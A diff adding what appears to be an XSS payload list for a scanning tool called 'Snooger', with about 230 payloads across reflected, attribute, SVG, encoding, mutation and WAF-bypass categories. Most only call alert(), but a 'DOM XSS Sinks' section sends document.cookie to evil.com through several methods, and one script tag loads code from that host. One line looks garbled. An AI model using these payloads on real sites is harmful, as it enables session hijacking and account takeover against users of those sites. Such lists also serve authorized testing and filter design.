@@ -1,0 +1,232 @@
+# Snooger XSS Payloads — 310+ real payloads with WAF bypass variants
+# Categories: Reflected, Stored, DOM, Attribute, Event Handler, SVG, Polyglot, WAF Bypass
+# ======================================================================================
+
+# === Basic Reflected XSS ===
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script src=//evil.com></script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>Function('alert(1)')()</script>
+<script>[].constructor.constructor('alert(1)')()</script>
+<script>window['alert'](1)</script>
+<script>this['alert'](1)</script>
+<script>top['alert'](1)</script>
+<script>self['alert'](1)</script>
+<script>parent['alert'](1)</script>
+<script>globalThis['alert'](1)</script>
+<script>frames['alert'](1)</script>
+<script>throw~delete~alert(1)</script>
+<script>var{a]alert(1)}=0</script>
+
+# === Event Handler Based ===
+<img src=x onerror=alert(1)>
+<img/src=x onerror=alert(1)>
+<img src=x onerror=alert`1`>
+<img src=x onerror=confirm(1)>
+<img src onerror=alert(1)>
+<img src=1 onerror=alert(document.domain)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload=alert`1`>
+<svg/onload=alert(document.domain)>
+<body onload=alert(1)>
+<body onresize=alert(1)>
+<body onfocus=alert(1)>
+<body onscroll=alert(1)>
+<body onpageshow=alert(1)>
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus><input autofocus>
+<input type=image src=x onerror=alert(1)>
+<input value="" onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus></textarea>
+<select onfocus=alert(1) autofocus></select>
+<details open ontoggle=alert(1)>
+<details ontoggle=alert(1) open>
+<video src=x onerror=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<marquee onstart=alert(1)>
+<isindex onmouseover=alert(1)>
+<keygen onfocus=alert(1) autofocus>
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<iframe src=javascript:alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
+<button onfocus=alert(1) autofocus>
+<fieldset/onfocus=alert(1)/autofocus>
+<animate onbegin=alert(1)>
+
+# === Attribute Injection ===
+" onmouseover="alert(1)
+" onfocus="alert(1)" autofocus="
+" onmouseover=alert(1) "
+' onmouseover='alert(1)
+" autofocus onfocus=alert(1) "
+" oncontextmenu=alert(1) "
+"onmouseover="alert(1)"
+' onfocus='alert(1)' autofocus='
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+'><svg onload=alert(1)>
+"><details open ontoggle=alert(1)>
+"><input onfocus=alert(1) autofocus>
+" accesskey="x" onclick="alert(1)" x="
+" style="animation-name:rotation" onanimationstart="alert(1)"
+
+# === JavaScript Context ===
+'-alert(1)-'
+'-alert(1)//
+';alert(1)//
+\';alert(1)//
+";alert(1)//
+\";alert(1)//
+</script><script>alert(1)</script>
+\u003cscript\u003ealert(1)\u003c/script\u003e
+${alert(1)}
+${7*7}
+{{constructor.constructor('alert(1)')()}}
+"-alert(1)-"
+`-alert(1)-`
+
+# === URL/Href Context ===
+javascript:alert(1)
+javascript:alert(document.domain)
+javascript:void(alert(1))
+jaVasCrIpT:alert(1)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:text/html,<img src=x onerror=alert(1)>
+vbscript:alert(1)
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
+&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;
+\x6Aavascript:alert(1)
+java\x0ascript:alert(1)
+java\x0dscript:alert(1)
+java\x09script:alert(1)
+
+# === SVG Based ===
+<svg><script>alert(1)</script></svg>
+<svg><script>alert&lpar;1&rpar;</script></svg>
+<svg><animate attributeName=href values=javascript:alert(1)>
+<svg><set attributeName=href to=javascript:alert(1)>
+<svg><animateTransform onbegin=alert(1)>
+<svg id=x onfocusin=alert(1) tabindex=1>
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x">
+<svg><a href="javascript:alert(1)"><text y=14>Click</text></a>
+<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+
+# === Tag Variations ===
+<ScRiPt>alert(1)</ScRiPt>
+<sCRIPT>alert(1)</sCRIPT>
+<SCRIPT>alert(1)</SCRIPT>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scri%00pt>alert(1)</scri%00pt>
+<<script>alert(1)<</script>
+<script x>alert(1)</script>
+<script x="">alert(1)</script>
+<script/x>alert(1)</script>
+<script >alert(1)</script>
+<script	>alert(1)</script>
+<script
+>alert(1)</script>
+<img """><script>alert(1)</script>">
+<Img Src=Xx OnError=alert(1)>
+<IMG SRC=x ONERROR=alert(1)>
+
+# === Encoding Bypass ===
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+%253Cscript%253Ealert(1)%253C/script%253E
+%uff1cscript%uff1ealert(1)%uff1c/script%uff1e
+<script>al\u0065rt(1)</script>
+<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
+<img src=x onerror=\u0061\u006C\u0065\u0072\u0074(1)>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
+<img src=x onerror=\x61\x6C\x65\x72\x74(1)>
+\u003csvg onload=alert(1)>
+\x3cscript\x3ealert(1)\x3c\x2fscript\x3e
+
+# === WAF Bypass Techniques ===
+<img/src="x"/onerror="alert(1)">
+<img src=x:alert(alt) onerror=eval(src) alt=1>
+<img src=x onerror=top[/al/.source+/ert/.source](1)>
+<img src=x onerror=self[atob('YWxlcnQ')](1)>
+<img src=x onerror=window['\x61lert'](1)>
+<img src=x onerror="window['al'+'ert'](1)">
+<img src=x onerror=[].constructor.constructor('return alert(1)')()>
+<img src=x onerror=Reflect.apply(alert,null,[1])>
+<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<img src=x onerror=setTimeout('alert(1)')>
+<img src=x onerror=setInterval('alert(1)')>
+<svg onload="alert(1)"//
+<svg onload="alert(1)"<!--
+<!--><svg onload=alert(1)>
+--><svg onload=alert(1)>
+--!><svg onload=alert(1)>
+<xss style="behavior:url(#default#time2)" onbegin="alert(1)">
+<x onclick=alert(1) style=position:fixed;top:0;left:0;width:100%;height:100%>Click
+<a href="&#1;javascript:alert(1)">Click</a>
+<a href="\1\4jAvAsCrIpT:alert(1)">X</a>
+<a href="java\tscript:alert(1)">X</a>
+<script>onerror=alert;throw 1</script>
+<script>{onerror=alert}throw 1</script>
+<script>throw onerror=alert,1</script>
+<script>TypeError.prototype.name='=/',0telerik_alert(1)</script>
+
+# === CSS Based ===
+<div style="background:url('javascript:alert(1)')">
+<style>@import "javascript:alert(1)";</style>
+<link rel=stylesheet href="javascript:alert(1)">
+<div style="xss:expression(alert(1))">
+<div style="-moz-binding:url(//evil/xss.xml#xss)">
+
+# === DOM XSS Sinks ===
+<img src=x onerror=document.location='http://evil.com/?c='+document.cookie>
+<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>
+<img src=x onerror=navigator.sendBeacon('http://evil.com',document.cookie)>
+<img src=x onerror=new Image().src='http://evil.com/?c='+btoa(document.cookie)>
+"><script>location="http://evil.com/?c="+encodeURIComponent(document.cookie)</script>
+
+# === Template Literal ===
+${alert(1)}
+${`${alert(1)}`}
+${constructor.constructor('alert(1)')()}
+{{constructor.constructor('alert(1)')()}}
+
+# === Mutation XSS (mXSS) ===
+<listing>&lt;img src=1 onerror=alert(1)&gt;</listing>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
+<form><math><mtext><form><mglyph><style></math><img src onerror=alert(1)>
+<svg><![CDATA[><image xlink:href="]]><img/src=xx:x onerror=alert(1)//"</svg>
+
+# === Exotic / Edge Cases ===
+<a/href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:alert(1)">Click</a>
+<d3v/oNmOuSeOvEr=alert(1)>xxx</d3v>
+1<script>alert(1)</script>
+"><img src=# id=xss onerror=alert(1)>
+<IMG LOWSRC="javascript:alert(1)">
+<img dynsrc="javascript:alert(1)">
+<video poster=javascript:alert(1)>
+<div contextmenu="xss">Right-Click<menu id="xss" onshow="alert(1)">
+<table background="javascript:alert(1)">
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;">
+%00%00%00%00%00%00%00<script>alert(1)</script>
+<sVg OnPointerEnter="location=javaSCRIPT&colon;alert%281%29">
+<tag onclick=alert(1)>anything
+<p/id=;</p onclick=alert()//
+<svg contentScriptType=text/vbs><script>MsgBox+1
+<a/href=%26%23106%3b%26%2397%3b%26%23118%3b%26%2397%3b%26%23115%3b%26%2399%3b%26%23114%3b%26%23105%3b%26%23112%3b%26%23116%3b%26%2358%3balert(1)>click
